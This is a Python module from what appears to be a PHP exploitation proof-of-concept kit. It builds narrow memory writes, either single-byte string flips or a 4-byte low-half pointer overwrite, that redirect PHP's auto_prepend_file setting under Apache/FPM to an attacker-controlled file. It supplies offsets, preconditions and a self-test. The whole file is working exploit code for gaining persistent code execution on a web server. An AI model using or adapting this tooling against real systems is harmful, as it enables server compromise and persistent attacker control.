#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INDEX: narrow-write fallbacks for auto_prepend dispatch | apache fpm | narrow write, pg(apf) already set
"""
Narrow-write fallbacks for the PG(auto_prepend_file) persistent dispatch.

Two PARTIAL-write variants, for a primitive that can only land a narrow write or
must flip the live target in place without reconstructing the pointer. Ported
from Bhavye-Malhotra/php2shell-2026 `pgwrite/MAPPING.md` §5 (DEMO A / DEMO B).

  flip_string_ops()  -- VARIANT-1B (DEMO A): single-byte write(s) that mutate the
    path STRING that PG(apf) already points at, flipping it to a different
    attacker-controlled filename. The PG field itself is NOT touched.

  swing_lowhalf_op() -- VARIANT-4B (DEMO B): a 4-byte write of the LOW HALF of the
    PG(apf) FIELD, swinging the pointer from one string to another that shares
    the same high 32 bits.

Preconditions / when to use
---------------------------
  * VARIANT-1B needs PG(apf) ALREADY non-NULL and pointing at a string whose
    address is known, AND the target filename to differ from the current one by
    only writable bytes; it cannot grow the string past its existing NUL.
  * VARIANT-4B needs PG(apf) ALREADY holding a pointer whose high 32 bits equal
    the high 32 bits of the target string's address.
These fit a physically narrow write primitive (1- or 4-byte overflow / partial-
pointer overwrite), flipping a pre-placed decoy in place, or avoiding a spill
into the adjacent PG(auto_append_file) at +0xa8.

The op-builders here reuse the shared field offset (+0xa0) and scratch geometry.
The write TRANSPORT is width-aware: the caller applies each (abs_addr,
width_bytes, value) op. For a
1-byte transport use `set {unsigned char}`, for 4-byte `set {unsigned int}`
(gdb), or the equivalently-sized store in a native primitive.

Pure stdlib. python3 -I safe.
"""

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import auto_prepend_persist  # noqa: E402  offsets, apf_addr, write_cstring


# Re-export for convenience so callers can import this module alone.
APACHE_8426_OFFSETS = auto_prepend_persist.APACHE_8426_OFFSETS
apf_addr = auto_prepend_persist.apf_addr


def _as_bytes(s):
    return s if isinstance(s, (bytes, bytearray)) else s.encode()


# VARIANT-1B: single-byte string-char flip (DEMO A)
def flip_string_ops(str_addr, cur_path, new_path):
    """Build the minimal set of SINGLE-BYTE writes that turn the NUL-terminated
    string `cur_path` (already living at absolute `str_addr`, which PG(apf)
    points at) into `new_path`.

    Returns a list of (abs_addr, 1, byte_value) ops -- one per differing byte.
    Requires len(new_path) <= len(cur_path): a 1-byte transport cannot grow the
    string past its existing NUL without extra writes, and growing risks running
    off the decoy's allocation. For the canonical case the two paths are the same
    length and differ in a single character (DEMO A: ...includeq -> ...includes),
    giving exactly ONE 1-byte write.

    Raises ValueError if new_path is longer than cur_path (use the 8-byte
    auto_prepend_persist.write_cstring / install() path instead when you must grow it).
    """
    cur = _as_bytes(cur_path)
    new = _as_bytes(new_path)
    if len(new) > len(cur):
        raise ValueError(
            "new_path (%d B) longer than cur_path (%d B): a 1-byte flip cannot "
            "grow the string; use auto_prepend_persist.install() (8-byte write) instead"
            % (len(new), len(cur)))
    ops = []
    # overwrite differing bytes
    for i, nb in enumerate(new):
        cb = cur[i] if i < len(cur) else 0
        if nb != cb:
            ops.append((str_addr + i, 1, nb))
    # if new is shorter, write the terminating NUL at len(new)
    if len(new) < len(cur) and cur[len(new)] != 0:
        ops.append((str_addr + len(new), 1, 0))
    return ops


# VARIANT-4B: low-half pointer swing of the PG(apf) FIELD (DEMO B)
def high32(addr):
    return addr >> 32


def low32(addr):
    return addr & 0xffffffff


def can_swing_lowhalf(cur_target_addr, new_target_addr):
    """True iff a 4-byte low-half write of the PG field can swing the pointer from
    cur_target_addr to new_target_addr -- i.e. they share the top 32 bits."""
    return high32(cur_target_addr) == high32(new_target_addr)


def swing_lowhalf_op(apf_field_addr, cur_target_addr, new_target_addr):
    """Build the single 4-byte write that swings PG(auto_prepend_file) from
    cur_target_addr to new_target_addr by overwriting ONLY the low 32 bits of the
    pointer field at `apf_field_addr`.

    Returns (apf_field_addr, 4, low32(new_target_addr)).

    Raises ValueError unless the two targets share the high 32 bits (otherwise a
    low-half write produces a corrupt pointer). This is the DEMO B precondition
    `high32eq=1`. Trivially satisfiable here because both strings live in the same
    libphp .bss scratch page, so their addresses share far more than 32 top bits.
    """
    if not can_swing_lowhalf(cur_target_addr, new_target_addr):
        raise ValueError(
            "high32 mismatch: cur=0x%x new=0x%x -- a 4-byte low-half write would "
            "corrupt the pointer; place the target string in the same 4GiB "
            "window as the current PG target, or use the 8-byte write"
            % (cur_target_addr, new_target_addr))
    return (apf_field_addr, 4, low32(new_target_addr))


if __name__ == "__main__":
    # Self-test (no target): exercise both builders against a fake memory model so
    # `python3 -I auto_prepend_persist_narrow.py` validates the arithmetic offline.
    base = 0x7f0000000000
    off = APACHE_8426_OFFSETS
    apf = apf_addr(base, off)
    scratch = base + off["pg_scratch_off"]

    # ---- VARIANT-1B: lay a decoy string, flip one byte, check the result ----
    mem = bytearray(0x200)
    def put(addr, s):
        b = _as_bytes(s)
        mem[addr:addr + len(b) + 1] = bytes(b) + b"\x00"
    decoy = "/tmp/ppd0.php"
    real = "/tmp/ppd1.php"
    put(0, decoy)
    ops = flip_string_ops(0, decoy, real)
    assert len(ops) == 1 and ops[0][1] == 1, ops
    for a, w, v in ops:
        mem[a] = v
    got = bytes(mem[:mem.index(0)]).decode()
    assert got == real, got
    print("VARIANT-1B self-test OK: %r -> %r via %d x 1-byte write at off %d"
          % (decoy, real, len(ops), ops[0][0]))

    # ---- VARIANT-4B: high32 gate + low-half op ----
    cur = scratch
    new = scratch + 0x40
    assert can_swing_lowhalf(cur, new)
    a, w, v = swing_lowhalf_op(apf, cur, new)
    assert w == 4 and a == apf and v == low32(new), (hex(a), w, hex(v))
    print("VARIANT-4B self-test OK: PG@0x%x low32 %08x->%08x (4-byte), high32eq=%s"
          % (apf, low32(cur), low32(new), high32(cur) == high32(new)))

    # negative: growing a string via 1-byte must be refused
    try:
        flip_string_ops(0, "/tmp/a", "/tmp/abc")
        raise AssertionError("expected ValueError for grow-via-1byte")
    except ValueError:
        print("VARIANT-1B grow-guard OK (refuses to grow via 1-byte)")
    # negative: high32 mismatch must be refused
    try:
        swing_lowhalf_op(apf, 0x7f0000000000, 0x800000000000)
        raise AssertionError("expected ValueError for high32 mismatch")
    except ValueError:
        print("VARIANT-4B high32-guard OK (refuses cross-4GiB swing)")
    print("SELF-TEST OK")
